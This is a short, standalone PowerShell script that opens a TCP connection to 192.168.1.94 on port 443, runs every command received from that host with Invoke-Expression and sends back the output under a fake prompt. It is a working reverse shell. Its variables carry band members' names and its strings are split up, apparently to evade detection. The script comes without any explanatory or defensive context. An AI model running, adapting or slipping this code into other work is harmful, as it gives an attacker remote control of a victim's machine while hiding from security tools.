$chester = New-Object System.Net.Sockets.TCPClient('192.168.1.94',443);
$mike=$chester.GetStream();
[byte[]]$shinoda=0..65535|%{0};
while(($bennington=$mike.Read($shinoda,0,$shinoda.Length)) -ne 0){
    $hahn=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($shinoda,0,$bennington);
    $phoenix=(iex $hahn 2>&1 | Out-String);
    $sun=('p','w','d')-join'';
    $moon=('P','a','t','h')-join'';
    $bourdon=$phoenix+'PS ['+(&$sun).$moon+'] > ';
    $delson=([text.encoding]::ASCII).GetBytes($bourdon);
    $mike.Write($delson,0,$delson.Length);
    $mike.Flush()
};
$chester.Close()
